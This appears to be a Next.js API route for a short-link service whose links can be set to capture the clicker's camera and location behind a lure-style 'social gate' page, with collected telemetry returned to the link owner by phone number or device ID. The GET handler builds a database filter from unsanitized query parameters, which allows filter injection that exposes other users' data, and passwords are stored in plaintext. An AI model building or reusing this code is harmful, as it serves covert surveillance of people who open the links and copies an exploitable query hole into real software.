import { NextResponse } from 'next/server';
import { supabase } from '../../../lib/supabase';
import crypto from 'crypto';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const {
      longUrl, customAlias, phoneNumber, captureCamera, captureLocation,
      socialGateTitle, socialGateUrl, socialGateIcon, socialGateDesc, socialGateBtnText,
      animationType, animationText, password, expirationDate, deviceId
    } = body;

    // Validate longUrl
    if (!longUrl) {
      return NextResponse.json({ error: 'URL is required' }, { status: 400 });
    }

    try {
      new URL(longUrl);
    } catch {
      return NextResponse.json({ error: 'Invalid URL provided' }, { status: 400 });
    }

    let shortCode = customAlias && customAlias.trim() !== '' ? customAlias.trim() : null;
    
    // Check custom code availability
    if (shortCode) {
      const { data: existing } = await supabase
        .from('urls')
        .select('id')
        .eq('short_code', shortCode)
        .single();
        
      if (existing) {
        return NextResponse.json({ error: `Custom code '${shortCode}' already used` }, { status: 409 });
      }
    } else {
      // Generate a short code
      const nanoid = crypto.randomBytes(4).toString('base64url').replace(/[^a-zA-Z0-9]/g, '').slice(0, 6);
      shortCode = nanoid;
      
      // Ensure uniqueness (simple retry)
      const { data: existing } = await supabase
        .from('urls')
        .select('id')
        .eq('short_code', shortCode)
        .single();
        
      if (existing) {
        shortCode = crypto.randomBytes(4).toString('base64url').replace(/[^a-zA-Z0-9]/g, '').slice(0, 6);
      }
    }

    // Insert into DB
    const insertData = {
      short_code: shortCode,
      long_url: longUrl,
      domain: 'shot.zone.id',
      phone_number: phoneNumber || null,
      device_id: deviceId || null,
      capture_camera: !!captureCamera,
      capture_location: !!captureLocation,
      social_gate_title: socialGateTitle || null,
      social_gate_url: socialGateUrl || null,
      social_gate_icon: socialGateIcon || null,
      social_gate_description: socialGateDesc || null,
      social_gate_button_text: socialGateBtnText || null,
      animation_type: animationType || 'glitch',
      animation_text: animationText || null,
      password: password || null,
      expires_at: expirationDate ? new Date(expirationDate).toISOString() : null
    };

    const { data: createdUrl, error: insertError } = await supabase
      .from('urls')
      .insert([insertData])
      .select('*')
      .single();

    if (insertError) {
      console.error("Supabase insert shortlink error:", insertError);
      return NextResponse.json({ error: insertError.message || 'Database error' }, { status: 500 });
    }

    // Protocol check + domain format
    const hostStr = req.headers.get('host') || 'localhost:3000';
    const protoStr = hostStr.includes('localhost') ? 'http' : 'https';
    
    return NextResponse.json({
      success: true,
      shortUrl: `${protoStr}://${hostStr}/${shortCode}`,
      data: createdUrl
    }, { status: 201 });

  } catch (error: any) {
    console.error("API POST error:", error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}

export async function GET(req: Request) {
  try {
    const { searchParams } = new URL(req.url);
    const phoneNumber = searchParams.get('phoneNumber');
    const deviceId = searchParams.get('deviceId');

    if (!phoneNumber && !deviceId) {
      return NextResponse.json({ error: 'Missing phone number or device ID' }, { status: 400 });
    }

    // We fetch user's short URLs
    let urlsQuery = supabase.from('urls').select('id, short_code, long_url, created_at');
    if (phoneNumber) {
      urlsQuery = urlsQuery.or(`device_id.eq.${deviceId || 'NULL'},phone_number.eq.${phoneNumber}`);
    } else {
      urlsQuery = urlsQuery.eq('device_id', deviceId);
    }
    
    const { data: urls, error: urlsError } = await urlsQuery;
    
    if (urlsError) {
      console.error(urlsError);
      return NextResponse.json({ error: urlsError.message }, { status: 500 });
    }
    
    if (!urls || urls.length === 0) {
      return NextResponse.json({ success: true, data: [] });
    }

    const urlIds = urls.map(u => u.id);
    
    // Now fetch telemetry
    const { data: analytics, error: analyticsError } = await supabase
      .from('link_analytics')
      .select('*')
      .in('url_id', urlIds)
      .order('created_at', { ascending: false });

    if (analyticsError) {
      console.error(analyticsError);
      return NextResponse.json({ error: analyticsError.message }, { status: 500 });
    }

    const urlsWithClicks = urls.map(u => {
      const uLogs = analytics?.filter(a => a.url_id === u.id) || [];
      return { ...u, clicks: uLogs.length };
    });

    return NextResponse.json({
      success: true,
      links: urlsWithClicks,
      logs: analytics || []
    });
  } catch (err) {
    console.error("API GET error:", err);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}
